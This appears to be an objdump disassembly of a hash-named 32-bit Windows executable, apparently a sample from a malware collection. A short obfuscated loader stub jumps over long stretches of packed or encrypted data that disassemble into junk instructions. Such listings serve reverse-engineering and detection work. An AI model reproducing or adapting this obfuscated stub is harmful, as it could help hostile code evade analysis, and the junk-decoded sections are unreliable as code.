
a2212a141f763aed1317573413f6c51845c0407a47c2b0e659e958e546fe563f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x4282b7,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42835f,0x0
  401016:	mov    DWORD PTR ds:0x42832f,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42827f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42835f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428db4
  40104b:	mov    ecx,DWORD PTR ds:0x4283e7
  401051:	sub    DWORD PTR ds:0x42829b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x4282c7
  40105e:	and    DWORD PTR ds:0x428283,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42820f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428307
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x4283bf,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282eb
  401089:	mov    edx,DWORD PTR ds:0x4283eb
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42834f,ebx
  40109a:	and    DWORD PTR ds:0x428297,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x3341034d]
  4010b6:	(bad)  
  4010b8:	jo     0x4010d2
  4010ba:	sbb    BYTE PTR [eax],bl
  4010bc:	sbb    BYTE PTR [esi-0x50e7e7ee],bl
  4010c2:	push   eax
  4010c3:	in     al,0x30
  4010c5:	ror    BYTE PTR [esi+0x38f9b1f0],0xe6
  4010cc:	cs sbb bh,dl
  4010cf:	shl    BYTE PTR [ecx+0x17f90d10],1
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esp
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	jp     0x4010dc
  401104:	clc    
  401105:	xchg   esp,eax
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    edi,ebx
  40111b:	aam    0x2c
  40111d:	push   ds
  40111e:	or     eax,0x6513018d
  401123:	and    al,0xa3
  401125:	call   0x9799:0x6c8f814e
  40112c:	cmp    DWORD PTR [ebx],edx
  40112e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40112f:	inc    esp
  401130:	add    BYTE PTR [edi],ch
  401132:	(bad)  
  401133:	jmp    0x9f70ccaf
  401138:	and    dh,BYTE PTR [ecx+0xc7b9014]
  40113e:	retfw  
  401140:	sbb    edx,DWORD PTR [ecx+0x62]
  401143:	push   cs
  401144:	mov    ebx,0x9eca872c
  401149:	(bad)  
  40114a:	inc    ebp
  40114b:	fsubr  DWORD PTR ds:0x4e676b3a
  401151:	mov    WORD PTR [ebx],?
  401153:	jmp    0x4010d8
  401155:	and    ebx,esp
  401157:	fld    QWORD PTR [edx]
  401159:	mov    bl,0xb9
  40115b:	shl    DWORD PTR [ecx-0x2ba74551],0xdb
  401162:	dec    eax
  401163:	aas    
  401164:	pop    eax
  401165:	and    esp,DWORD PTR [ecx]
  401167:	and    BYTE PTR [ecx+0xd],0x42
  40116b:	dec    ebx
  40116c:	repnz sbb esp,esp
  40116f:	cdq    
  401170:	not    DWORD PTR [ebx]
  401172:	out    dx,al
  401173:	aam    0x6d
  401175:	wbinvd 
  401177:	cli    
  401178:	pop    ss
  401179:	inc    ebx
  40117a:	fdiv   DWORD PTR [ebp+0x19]
  40117d:	pop    ebx
  40117e:	mov    esi,0x58e609d8
  401183:	stc    
  401184:	(bad)  
  401186:	std    
  401187:	nop
  401188:	add    al,0x78
  40118a:	shr    edi,0xa9
  40118d:	imul   eax,DWORD PTR [ecx+0x71],0xffffffbf
  401191:	retf   0xfd29
  401194:	inc    esi
  401195:	cmp    eax,0x5bdd58dc
  40119a:	cdq    
  40119b:	dec    eax
  40119c:	mov    edx,0xec085af0
  4011a1:	push   ecx
  4011a2:	lock (bad) 
  4011a4:	jmp    0x40121b
  4011a6:	adc    eax,0x56816440
  4011ab:	repz loop 0x401168
  4011ae:	repz mov ch,0x50
  4011b1:	mov    ds:0x97e90389,al
  4011b6:	out    dx,al
  4011b7:	popf   
  4011b8:	popf   
  4011b9:	xchg   edx,eax
  4011ba:	mov    WORD PTR [ecx+0x3f134621],gs
  4011c0:	mov    ah,ah
  4011c2:	shl    DWORD PTR [ecx-0x49],1
  4011c5:	ret    
  4011c6:	pop    edx
  4011c7:	and    DWORD PTR [ebx],ebx
  4011c9:	adc    DWORD PTR [ebp-0x41],eax
  4011cc:	and    al,BYTE PTR [ebp+0x4522fc94]
  4011d2:	mov    ch,0x23
  4011d4:	mov    dl,0x6b
  4011d6:	popf   
  4011d7:	and    edx,esp
  4011d9:	or     edx,DWORD PTR [edx+edi*8+0x7fbb8294]
  4011e0:	stos   BYTE PTR es:[edi],al
  4011e1:	cmp    DWORD PTR [edi-0x56b52be1],esi
  4011e7:	hlt    
  4011e8:	sahf   
  4011e9:	cmp    al,0x25
  4011eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011ec:	push   esi
  4011ed:	add    eax,0xe25cf43e
  4011f2:	jo     0x4011c1
  4011f4:	call   FWORD PTR [eax-0x70f340d4]
  4011fa:	pushf  
  4011fb:	sti    
  4011fc:	ds cmc 
  4011fe:	(bad)  [eax]
  401200:	inc    edx
  401201:	or     DWORD PTR [edx+0x739f3636],eax
  401207:	lods   al,BYTE PTR ds:[esi]
  401208:	sub    eax,0xd5c6868c
  40120d:	mov    esp,0xaf5c7775
  401212:	mov    ebp,0xc61d61f6
  401217:	mov    bh,0xcb
  401219:	xor    BYTE PTR [eax+0x11],bl
  40121c:	inc    ebp
  40121d:	mov    esp,0xcc543e3
  401222:	sub    DWORD PTR [ecx+0x4e4ac2e2],esp
  401228:	pusha  
  401229:	jns    0x401261
  40122b:	jns    0x4011f3
  40122d:	inc    edx
  40122e:	jnp    0x40123b
  401230:	les    edi,FWORD PTR [eax]
  401232:	fs (bad) 
  401234:	out    dx,al
  401235:	push   ebp
  401236:	push   es
  401237:	enter  0x597b,0xa0
  40123b:	push   ss
  40123c:	sti    
  40123d:	jo     0x4011cc
  40123f:	les    edx,FWORD PTR [ebp+0x36]
  401242:	pop    ebp
  401243:	ja     0x40125d
  401245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401246:	leave  
  401247:	bound  ebp,QWORD PTR [eax]
  401249:	test   al,0x15
  40124b:	shl    DWORD PTR [ecx+0x3c15d4a2],1
  401251:	hlt    
  401252:	dec    esi
  401253:	loop   0x40121a
  401255:	scas   al,BYTE PTR es:[edi]
  401256:	pop    edi
  401257:	add    al,0x8b
  401259:	test   eax,0x86944e25
  40125e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40125f:	xchg   ebx,eax
  401260:	fadd   QWORD PTR [edi+0x54]
  401263:	pop    edi
  401264:	jle    0x4012aa
  401266:	xor    ebx,DWORD PTR [eax+0x1b886b06]
  40126c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40126d:	adc    DWORD PTR [ecx],ebx
  40126f:	pop    eax
  401270:	xchg   esi,eax
  401271:	rcr    ecx,1
  401273:	inc    eax
  401274:	jecxz  0x4012a7
  401276:	or     cl,BYTE PTR [esi]
  401278:	lea    ebp,[esi]
  40127a:	xor    eax,0xf6172d5e
  40127f:	xor    al,BYTE PTR [esp+eiz*4]
  401282:	enter  0xac09,0xfa
  401286:	inc    edi
  401287:	int    0x61
  401289:	inc    ebp
  40128a:	ds scas al,BYTE PTR es:[edi]
  40128c:	repnz mov esi,0x30094760
  401292:	addr16 sahf 
  401294:	pop    eax
  401295:	jno    0x40124c
  401297:	inc    eax
  401298:	sbb    dh,0x9a
  40129b:	sbb    edi,edx
  40129d:	inc    esp
  40129e:	mov    ds:0xa979957d,al
  4012a3:	pop    esp
  4012a4:	xor    DWORD PTR [edi+0x18],ebx
  4012a7:	and    DWORD PTR ds:0x42dfc3f8,edi
  4012ad:	idiv   BYTE PTR [bx+di]
  4012b0:	add    BYTE PTR [eax-0x7e1a7ea9],dl
  4012b6:	hlt    
  4012b7:	call   0x82b8:0xf82571ba
  4012be:	iret   
  4012bf:	fstp   QWORD PTR [ebx+ecx*8-0x190eba25]
  4012c6:	outs   dx,BYTE PTR ds:[esi]
  4012c7:	int    0x8e
  4012c9:	pop    edx
  4012ca:	in     al,0x61
  4012cc:	jl     0x4012e2
  4012ce:	aaa    
  4012cf:	loope  0x401292
  4012d1:	jbe    0x4012c2
  4012d3:	sar    BYTE PTR [ecx+edx*8],cl
  4012d6:	xchg   dh,ch
  4012d8:	rcr    DWORD PTR [esi-0x37],cl
  4012db:	pop    eax
  4012dc:	sub    eax,0xe816f5da
  4012e1:	dec    eax
  4012e2:	mov    ds:0x9e64f181,al
  4012e7:	xor    eax,0xbe078dd4
  4012ec:	xchg   ebp,eax
  4012ed:	(bad)  [esi+0x182968a7]
  4012f3:	adc    DWORD PTR [edi-0x36],0x42de688e
  4012fa:	dec    ecx
  4012fb:	sahf   
  4012fc:	jp     0x4012a7
  4012fe:	mov    ecx,ebp
  401300:	lods   eax,DWORD PTR ds:[esi]
  401301:	jno    0x4012ef
  401303:	mov    ebp,0x5b9d6770
  401308:	mov    ah,0xd7
  40130a:	dec    edx
  40130b:	sar    DWORD PTR [eax-0x5],cl
  40130e:	in     eax,dx
  40130f:	pushf  
  401310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401311:	xchg   ebx,eax
  401312:	nop
  401313:	outs   dx,BYTE PTR ds:[esi]
  401314:	lods   al,BYTE PTR ds:[esi]
  401315:	icebp  
  401316:	sti    
  401317:	pop    eax
  401318:	jbe    0x4012e6
  40131a:	and    ecx,edi
  40131c:	or     BYTE PTR [ebx-0x34],0xa6
  401320:	std    
  401321:	inc    edi
  401322:	fwait
  401323:	imul   edx,DWORD PTR [ecx+0x69],0x7
  401327:	lock arpl WORD PTR [edi+0x396dab55],bp
  40132e:	loope  0x401315
  401330:	mov    ds:0xd97dc5c,al
  401335:	ja     0x4012f8
  401337:	fisttp WORD PTR [ebx+eax*4+0x1f5529a2]
  40133e:	div    DWORD PTR [ecx-0x19]
  401341:	and    DWORD PTR [eax+0xdb493b8],ebp
  401347:	xchg   DWORD PTR [eax],esp
  401349:	cmp    ah,0xad
  40134c:	adc    eax,0x89d2587f
  401351:	push   esi
  401352:	mov    cs,WORD PTR [edi]
  401354:	xchg   edi,eax
  401355:	xlat   BYTE PTR ds:[ebx]
  401356:	push   ecx
  401357:	pop    esp
  401358:	sbb    DWORD PTR [edx+0x1f8632be],eax
  40135e:	mov    edx,0xd75f73b8
  401363:	adc    BYTE PTR ds:0x9da7d719,bl
  401369:	div    bl
  40136b:	push   esp
  40136c:	mov    edx,DWORD PTR [edx+esi*1+0x461c4da7]
  401373:	jg     0x4013da
  401375:	in     eax,dx
  401376:	test   BYTE PTR [edx],dh
  401378:	pop    ss
  401379:	xlat   BYTE PTR ds:[ebx]
  40137a:	push   ss
  40137b:	pusha  
  40137c:	push   eax
  40137d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40137e:	dec    eax
  40137f:	and    al,0xef
  401381:	push   esp
  401382:	scas   eax,DWORD PTR es:[edi]
  401383:	scas   al,BYTE PTR es:[edi]
  401384:	or     ecx,DWORD PTR [eax-0x7e]
  401387:	aas    
  401388:	sti    
  401389:	cld    
  40138a:	xlat   BYTE PTR ds:[ebx]
  40138b:	mov    ecx,0x55870434
  401390:	sbb    esi,edx
  401392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401393:	stc    
  401394:	add    al,BYTE PTR [edi-0x34]
  401397:	les    ebp,FWORD PTR [esp+ebx*1-0x41]
  40139b:	js     0x4013ca
  40139d:	mov    WORD PTR [eax],es
  40139f:	or     BYTE PTR [ecx+0x58],ch
  4013a2:	enter  0x4c6e,0x93
  4013a6:	dec    edi
  4013a7:	(bad)  
  4013a8:	std    
  4013a9:	jmp    FWORD PTR [ecx]
  4013ab:	cmp    DWORD PTR [edi-0x5fe135b0],edi
  4013b1:	push   eax
  4013b2:	and    esp,DWORD PTR [ebx]
  4013b4:	push   ebx
  4013b5:	mov    dl,0xba
  4013b7:	pushf  
  4013b8:	imul   eax,esi,0x6f4027ca
  4013be:	loopne 0x401432
  4013c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013c1:	pop    esi
  4013c2:	(bad)  
  4013c3:	iret   
  4013c4:	jge    0x401370
  4013c6:	dec    ebx
  4013c7:	imul   ecx,DWORD PTR [eax],0xcc70017
  4013cd:	ds sub al,0xf8
  4013d0:	scas   al,BYTE PTR es:[edi]
  4013d1:	aad    0x6d
  4013d3:	push   esp
  4013d4:	mov    fs,WORD PTR [eax+0x60f7d3ff]
  4013da:	dec    edi
  4013db:	add    DWORD PTR [esi-0x6],esp
  4013de:	cld    
  4013df:	jbe    0x4013ed
  4013e1:	rol    DWORD PTR [esi-0x3],cl
  4013e4:	popf   
  4013e5:	mov    ecx,esi
  4013e7:	in     eax,dx
  4013e8:	gs cdq 
  4013ea:	add    al,0xf5
  4013ec:	pop    ebx
  4013ed:	aas    
  4013ee:	sahf   
  4013ef:	xchg   ecx,eax
  4013f0:	repz popa 
  4013f2:	(bad)  
  4013f3:	(bad)  
  4013f4:	in     eax,dx
  4013f5:	mov    dh,0x8f
  4013f7:	leave  
  4013f8:	cmp    DWORD PTR [ebp+0x1f],esi
  4013fb:	lods   al,BYTE PTR ds:[esi]
  4013fc:	sub    al,cl
  4013fe:	xchg   esi,eax
  4013ff:	call   0x491a5b6f
  401404:	loop   0x40138d
  401406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401407:	ds dec dx
  40140a:	stos   BYTE PTR es:[edi],al
  40140b:	add    BYTE PTR [ebx-0x4a],0x4
  40140f:	cs loope 0x40140b
  401412:	(bad)  
  401413:	fisttp DWORD PTR [ecx+edx*1+0x46]
  401417:	adc    al,0xe8
  401419:	pop    ecx
  40141a:	stos   DWORD PTR es:[edi],eax
  40141b:	(bad)  
  40141c:	fild   WORD PTR [ecx-0xee91c04]
  401422:	aaa    
  401423:	lods   eax,DWORD PTR ds:[esi]
  401424:	jecxz  0x40146b
  401426:	outs   dx,DWORD PTR ds:[esi]
  401427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401428:	push   eax
  401429:	dec    ebx
  40142a:	push   ds
  40142b:	scas   eax,DWORD PTR es:[edi]
  40142c:	mov    al,BYTE PTR ds:0x57354048
  401432:	(bad)  [ebp+0x20]
  401435:	addr16 (bad) 
  401437:	int3   
  401438:	pusha  
  401439:	js     0x401454
  40143b:	jecxz  0x401417
  40143d:	cmp    ecx,DWORD PTR [eax*4+0x5c5c0f6f]
  401444:	cli    
  401445:	dec    ecx
  401446:	and    ch,dh
  401448:	xchg   ebp,eax
  401449:	imul   ebx,DWORD PTR [ebp+0x16],0xffffff96
  40144d:	ins    BYTE PTR es:[edi],dx
  40144e:	cmp    al,0x14
  401450:	xchg   al,cl
  401452:	mov    eax,ds:0x981b4cd5
  401457:	in     al,0xca
  401459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40145a:	inc    ecx
  40145b:	or     cl,al
  40145d:	push   edi
  40145e:	jmp    0xbf6db0cc
  401463:	int    0xa8
  401465:	mov    ebp,0xc7192e64
  40146a:	popf   
  40146b:	sbb    BYTE PTR [eax-0x48db34ee],al
  401471:	aad    0x67
  401473:	js     0x401426
  401475:	sub    DWORD PTR [ecx+0x141ee665],eax
  40147b:	jmp    0xb5d9:0x45271a50
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x4283af,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282eb
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42833b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42826b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428293,0x0
  4014da:	mov    DWORD PTR ds:0x42826f,ecx
  4014e0:	mov    DWORD PTR ds:0x428333,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x4281ab
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428293,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428db8
  40151c:	mov    edx,DWORD PTR ds:0x42830b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428383
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281df
  401537:	mov    edi,DWORD PTR ds:0x428387
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x7336ff70]
  401569:	jl     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi-0x19e7e7ee],bl
  401573:	imul   eax,DWORD PTR [edi-0x2fcdb722],0x7af8c34e
  40157d:	popa   
  40157e:	daa    
  40157f:	std    
  401580:	iret   
  401581:	lods   al,BYTE PTR ds:[esi]
  401582:	jbe    0x401520
  401584:	push   esp
  401585:	stc    
  401586:	leave  
  401587:	out    0x7e,eax
  401589:	je     0x4015ba
  40158b:	test   BYTE PTR [edi],0x7c
  40158e:	xlat   BYTE PTR ds:[ebx]
  40158f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401590:	in     eax,0x9b
  401592:	cmp    cl,cl
  401594:	xor    al,bl
  401596:	and    DWORD PTR [ebx],edi
  401598:	stos   BYTE PTR es:[edi],al
  401599:	ja     0x4015e4
  40159b:	adc    edi,DWORD PTR [ebx+0x2385da21]
  4015a1:	lods   al,BYTE PTR ds:[esi]
  4015a2:	lahf   
  4015a3:	(bad)  
  4015a4:	jo     0x4015fe
  4015a6:	mov    dh,0xd7
  4015a8:	iret   
  4015a9:	mov    bh,0x4a
  4015ab:	pop    edx
  4015ac:	inc    ebp
  4015ad:	pop    ecx
  4015ae:	in     al,dx
  4015af:	cmp    BYTE PTR [ebp+0x12f67e1c],ah
  4015b5:	ficomp WORD PTR [ecx]
  4015b7:	mov    bh,0xf3
  4015b9:	dec    ecx
  4015ba:	xchg   esi,eax
  4015bb:	jle    0x401543
  4015bd:	stos   DWORD PTR es:[edi],eax
  4015be:	push   ebx
  4015bf:	neg    esi
  4015c1:	inc    esp
  4015c2:	pop    edx
  4015c3:	pop    edx
  4015c4:	scas   eax,DWORD PTR es:[edi]
  4015c5:	mov    dl,0x8
  4015c7:	dec    ecx
  4015c8:	sar    dl,cl
  4015ca:	out    dx,al
  4015cb:	add    BYTE PTR [ebx-0x5c],ah
  4015ce:	add    ebp,ecx
  4015d0:	push   edx
  4015d1:	popa   
  4015d2:	adc    DWORD PTR [ebx],edi
  4015d4:	(bad)  
  4015d5:	cs xchg esp,eax
  4015d7:	pushf  
  4015d8:	mov    dh,0x9d
  4015da:	adc    al,0xca
  4015dc:	sub    dl,BYTE PTR [edx-0x17]
  4015df:	jmp    DWORD PTR [ebp-0x6b]
  4015e2:	xchg   ebx,eax
  4015e3:	mov    ds:0x55a95f82,al
  4015e8:	je     0x4015ea
  4015ea:	(bad)  
  4015eb:	jle    0x4015bf
  4015ed:	test   eax,0xd4f306b1
  4015f2:	mov    dh,0xf
  4015f4:	es scas eax,DWORD PTR es:[edi]
  4015f6:	lock mov al,0x73
  4015f9:	or     DWORD PTR [edi+ebx*8+0x7b93a724],esp
  401600:	adc    DWORD PTR [ecx+edx*4],esp
  401603:	mov    ch,0xcd
  401605:	hlt    
  401606:	jnp    0x4015ec
  401608:	adc    eax,0x6b49d41f
  40160d:	lods   eax,DWORD PTR ds:[esi]
  40160e:	fisttp QWORD PTR [edi-0x1e]
  401611:	fld1   
  401613:	ja     0x40166a
  401615:	jl     0x401664
  401617:	sar    BYTE PTR [ebx],0x74
  40161a:	dec    eax
  40161b:	push   edi
  40161c:	fsubr  QWORD PTR [edx-0x53]
  40161f:	aam    0x9f
  401621:	stos   BYTE PTR es:[edi],al
  401622:	(bad)  
  401624:	loop   0x40162a
  401626:	sbb    eax,0xfe50389f
  40162b:	xor    BYTE PTR [esi+0x47],al
  40162e:	cdq    
  40162f:	inc    esp
  401630:	in     al,0x93
  401632:	test   ax,0xd82d
  401636:	arpl   WORD PTR [ebp-0x1],di
  401639:	pop    esp
  40163a:	lahf   
  40163b:	loopne 0x401673
  40163d:	xor    al,ch
  40163f:	jb     0x40163d
  401641:	mov    eax,ds:0x1d8b5a8a
  401646:	push   esp
  401647:	push   esi
  401648:	jl     0x401694
  40164a:	in     eax,dx
  40164b:	sbb    eax,DWORD PTR [edx]
  40164d:	das    
  40164e:	xchg   BYTE PTR [edi],ch
  401650:	loop   0x401644
  401652:	jne    0x40160c
  401654:	xchg   ebx,eax
  401655:	nop
  401656:	and    BYTE PTR [ecx],bh
  401658:	loopne 0x4016c4
  40165a:	mov    dh,0xf8
  40165c:	test   ebx,0xda5b0beb
  401662:	fs push es
  401664:	mov    al,0xa6
  401666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401667:	dec    BYTE PTR [ecx]
  401669:	pop    edi
  40166a:	xor    eax,0x8769df27
  40166f:	imul   esi,DWORD PTR [esi-0x5e],0x1384434c
  401676:	pushf  
  401677:	mov    ebx,0xadd512c7
  40167c:	adc    BYTE PTR [esi],0x39
  40167f:	mov    dl,0x9f
  401681:	adc    al,0x47
  401683:	inc    edi
  401684:	pop    esp
  401685:	add    dl,BYTE PTR [ecx+0x49]
  401688:	cmp    ch,0x4c
  40168b:	mov    eax,0x8e5d9144
  401690:	cmp    ebp,DWORD PTR [ebp+edi*4-0x18]
  401694:	iret   
  401695:	adc    bh,BYTE PTR [ebx+0x69f9b92c]
  40169b:	cwde   
  40169c:	stc    
  40169d:	jmp    0xe64c2d9f
  4016a2:	sub    ebp,DWORD PTR [esp+edi*1-0x53b0d01]
  4016a9:	add    BYTE PTR [ecx-0x33],bl
  4016ac:	push   edi
  4016ad:	sbb    eax,0x58a53184
  4016b2:	mov    eax,0xbce691c
  4016b7:	movsx  edx,BYTE PTR [edx-0x4]
  4016bb:	std    
  4016bc:	adc    eax,0xc53dbb52
  4016c1:	xchg   ebp,eax
  4016c2:	(bad)  
  4016c3:	outs   dx,DWORD PTR ds:[esi]
  4016c4:	out    dx,eax
  4016c5:	faddp  st(2),st
  4016c7:	cmp    edx,esi
  4016c9:	mov    DWORD PTR [eax+0x6b2c02f7],ebx
  4016cf:	popf   
  4016d0:	jne    0x4016b5
  4016d2:	(bad)  
  4016d3:	sub    eax,DWORD PTR [edx+0x7e]
  4016d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016d7:	ret    
  4016d8:	push   edi
  4016d9:	mov    fs,ecx
  4016db:	mov    ch,0x9f
  4016dd:	and    ecx,DWORD PTR [ecx+0x39]
  4016e0:	ss xchg edi,eax
  4016e2:	pop    ebp
  4016e3:	scas   al,BYTE PTR es:[edi]
  4016e4:	lock aas 
  4016e6:	mov    esi,0xef766c67
  4016eb:	mov    bh,0x1b
  4016ed:	xchg   edx,eax
  4016ee:	mov    esi,DWORD PTR [esi]
  4016f0:	enter  0x448f,0x30
  4016f4:	dec    edi
  4016f5:	(bad)  
  4016f6:	dec    DWORD PTR [ebx+0xc2e57f5]
  4016fc:	xchg   ebx,eax
  4016fd:	test   eax,0x2fd10311
  401702:	arpl   dx,ax
  401704:	in     eax,dx
  401705:	iret   
  401706:	mov    esp,0x3877364b
  40170b:	fcmovnbe st,st(7)
  40170d:	inc    eax
  40170e:	je     0x401777
  401710:	xor    BYTE PTR [ecx+0x4bead124],bh
  401716:	jle    0x40171a
  401718:	pushf  
  401719:	lods   eax,DWORD PTR ds:[esi]
  40171a:	stc    
  40171b:	pop    ebx
  40171c:	popa   
  40171d:	std    
  40171e:	pop    ebx
  40171f:	xor    edx,DWORD PTR [eax]
  401721:	lock add eax,0xf1d789ab
  401727:	pop    ebp
  401728:	jp     0x4016e2
  40172a:	adc    al,0x4e
  40172c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40172d:	dec    ebx
  40172e:	iret   
  40172f:	cmp    esp,DWORD PTR [ecx-0x578355b1]
  401735:	mov    ecx,0xb0fc338
  40173a:	xlat   BYTE PTR ds:[ebx]
  40173b:	jb     0x40178d
  40173d:	cmp    al,0x8
  40173f:	sbb    dl,cl
  401741:	jne    0x4017a6
  401743:	ins    DWORD PTR es:[edi],dx
  401744:	xchg   esi,eax
  401745:	repnz fs mov cl,0x5d
  401749:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40174b:	rcr    BYTE PTR [eax-0x2d],1
  40174e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40174f:	pop    ds
  401750:	pop    ebp
  401751:	pop    ecx
  401752:	retf   
  401753:	scas   eax,DWORD PTR es:[edi]
  401754:	shl    DWORD PTR [esi+eiz*4-0x1c],1
  401758:	pop    edx
  401759:	out    0x3e,al
  40175b:	out    dx,al
  40175c:	mov    eax,DWORD PTR [eax+0x55]
  40175f:	pop    ebp
  401760:	and    al,0xc8
  401762:	imul   ecx,DWORD PTR [edi+0x6d64b6d2],0xef5e6669
  40176c:	xor    eax,0xb1f77672
  401771:	retf   
  401772:	xchg   ebp,eax
  401773:	fimul  DWORD PTR [ebx-0x10]
  401776:	popf   
  401777:	dec    esi
  401778:	pushf  
  401779:	fld    DWORD PTR [esi-0x73]
  40177c:	push   ecx
  40177d:	add    dl,BYTE PTR [ebx+0x50f5c1de]
  401783:	shl    BYTE PTR ss:[ebp+0x3c7565c7],cl
  40178a:	xchg   eax,edi
  40178c:	jne    0x401735
  40178e:	or     DWORD PTR [esi+0x10],ecx
  401791:	popf   
  401792:	xchg   ebx,eax
  401793:	cmp    DWORD PTR [ecx-0x383447e3],0xe3a37e08
  40179d:	jge    0x4017fb
  40179f:	(bad)  [esi-0x5f100825]
  4017a5:	push   ebx
  4017a6:	mov    fs,eax
  4017a8:	sbb    eax,0xea1226df
  4017ae:	cmp    edi,esp
  4017b0:	mov    edx,0x84867a48
  4017b5:	adc    eax,DWORD PTR [ecx+0x1c]
  4017b8:	stc    
  4017b9:	pop    ss
  4017ba:	adc    dx,WORD PTR [ebp-0xbc495bf]
  4017c1:	lods   eax,DWORD PTR ds:[esi]
  4017c2:	push   edi
  4017c3:	mov    ebp,es
  4017c5:	cmp    DWORD PTR [edx+0xa],0x8d78157
  4017cc:	out    dx,eax
  4017cd:	jns    0x4017cc
  4017cf:	jns    0x40175f
  4017d1:	or     cl,BYTE PTR [esi]
  4017d3:	add    BYTE PTR [eax-0x69ae5aab],dh
  4017d9:	test   eax,0x6f77251b
  4017de:	mov    al,0xad
  4017e0:	jg     0x40179b
  4017e2:	sub    bl,BYTE PTR [edx]
  4017e4:	ins    BYTE PTR es:[edi],dx
  4017e5:	mov    bh,0x58
  4017e7:	and    BYTE PTR [edi-0x448af6f1],ch
  4017ed:	cld    
  4017ee:	jp     0x4017af
  4017f0:	ss nop
  4017f2:	sahf   
  4017f3:	fadd   DWORD PTR [esi+0x463b3fc6]
  4017f9:	sbb    eax,0x9308fc50
